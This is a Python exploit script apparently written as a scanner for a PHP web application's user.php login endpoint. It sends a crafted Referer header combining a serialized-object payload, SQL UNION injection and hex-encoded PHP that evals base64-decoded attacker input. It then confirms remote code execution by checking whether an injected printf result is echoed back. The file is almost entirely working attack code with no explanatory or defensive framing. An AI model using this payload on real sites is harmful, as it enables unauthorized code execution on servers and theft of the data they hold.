import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r1=randomInt(40000, 44800)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r2=randomInt(40000, 44800)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"user.php"
	body="action=login&pp123=printf("+str(r1)+"*"+str(r2)+");"
	headers={'Content-Type': 'application/x-www-form-urlencoded', 'Referer': '554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:193:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b6576616c09286261736536345f6465636f64650928275a585a686243676b5831425055315262634841784d6a4e644b54733d2729293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1\' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(r1 * r2) in response.text:
		v2x0=True
	else:
		v2x0=False
	url=baseurl+"user.php"
	body="action=login&pp123=printf("+str(r1)+"*"+str(r2)+");"
	headers={'Content-Type': 'application/x-www-form-urlencoded', 'Referer': '45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:193:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b6576616c09286261736536345f6465636f64650928275a585a686243676b5831425055315262634841784d6a4e644b54733d2729293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1\' UNION/*";}45ea207d7a2b68c49582d2d22adf953aads'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(r1 * r2) in response.text:
		v3x0=True
	else:
		v3x0=False
	if v2x0 or v3x0:
		return True
	else:
		return False
